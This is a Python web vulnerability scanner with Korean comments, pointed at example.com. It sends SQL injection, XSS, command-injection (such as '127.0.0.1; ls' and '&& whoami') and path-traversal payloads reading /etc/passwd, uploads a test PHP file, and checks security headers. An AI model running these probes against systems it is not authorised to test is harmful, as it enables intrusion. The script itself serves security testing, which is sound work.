import requests

# 검사할 웹사이트 URL
url = "http://example.com/upload"

# SQL 인젝션 페이로드
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin' --",
    "admin' #",
    "admin'/*"
]

# XSS 페이로드
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "'\"><script>alert('XSS')</script>"
]

# 명령어 삽입 페이로드
command_injection_payloads = [
    "127.0.0.1; ls",
    "127.0.0.1 && whoami",
    "127.0.0.1 | dir"
]

# LFI 페이로드
lfi_payloads = [
    "../../../../etc/passwd",
    "../../../../windows/system.ini",
    "../../../../boot.ini"
]

# 취약한 경로 리스트
directory_paths = [
    "admin/",
    "uploads/",
    "files/",
    "backup/",
    "config/"
]

# 파일 업로드 취약점 테스트
upload_url = "http://example.com/upload"

# SQL 인젝션 탐지 함수
def sqli_scan(url):
    print(f"SQL 인젝션 스캔을 시작합니다: {url}")
    
    for payload in sql_payloads:
        params = {'username': payload, 'password': 'password'}
        response = requests.get(url, params=params)
        
        if "로그인 성공" in response.text or "환영합니다" in response.text:
            print(f"[+] SQL 인젝션 취약점 발견됨! 페이로드: {payload}")
        else:
            print(f"[-] 안전함: {payload}")

# XSS 탐지 함수
def xss_scan(url):
    print(f"XSS 스캔을 시작합니다: {url}")
    
    for payload in xss_payloads:
        params = {'search': payload}
        response = requests.get(url, params=params)
        
        if payload in response.text:
            print(f"[+] XSS 취약점 발견됨! 페이로드: {payload}")
        else:
            print(f"[-] 안전함: {payload}")

# 명령어 삽입 탐지 함수
def command_injection_scan(url):
    print(f"명령어 삽입 스캔을 시작합니다: {url}")
    
    for payload in command_injection_payloads:
        params = {'ip': payload}
        response = requests.get(url, params=params)
        
        if "root" in response.text or "admin" in response.text:
            print(f"[+] 명령어 삽입 취약점 발견됨! 페이로드: {payload}")
        else:
            print(f"[-] 안전함: {payload}")

# LFI 탐지 함수
def lfi_scan(url):
    print(f"LFI 스캔을 시작합니다: {url}")
    
    for payload in lfi_payloads:
        params = {'file': payload}
        response = requests.get(url, params=params)
        
        if "root:" in response.text or "[boot loader]" in response.text:
            print(f"[+] LFI 취약점 발견됨! 페이로드: {payload}")
        else:
            print(f"[-] 안전함: {payload}")

# 파일 업로드 취약점 탐지 함수
def file_upload_scan(upload_url):
    print(f"파일 업로드 취약점 스캔을 시작합니다: {upload_url}")
    
    # 업로드할 테스트 파일
    files = {'file': ('test.php', '<?php echo "파일 업로드 테스트"; ?>')}
    
    response = requests.post(upload_url, files=files)
    
    if response.status_code == 200 and "파일 업로드 성공" in response.text:
        print(f"[+] 파일 업로드 취약점 발견됨!")
    else:
        print(f"[-] 파일 업로드 취약점 없음")

# 취약한 HTTP 헤더 확인 함수
def check_http_headers(url):
    print(f"HTTP 헤더를 검사합니다: {url}")
    
    response = requests.get(url)
    
    headers = response.headers
    
    if 'X-Frame-Options' not in headers:
        print("[+] X-Frame-Options 헤더가 없습니다. 클릭재킹에 취약할 수 있습니다.")
    if 'Content-Security-Policy' not in headers:
        print("[+] Content-Security-Policy 헤더가 없습니다. XSS에 취약할 수 있습니다.")
    if 'Strict-Transport-Security' not in headers:
        print("[+] Strict-Transport-Security 헤더가 없습니다. SSL/TLS 설정이 부족할 수 있습니다.")

# 메인 함수
def main(url):
    print(f"웹 취약점 검사를 시작합니다: {url}")
    sqli_scan(url)
    xss_scan(url)
    command_injection_scan(url)
    lfi_scan(url)
    file_upload_scan(upload_url)
    check_http_headers(url)
    print("검사가 완료되었습니다.")

# 검사 실행
main(url)
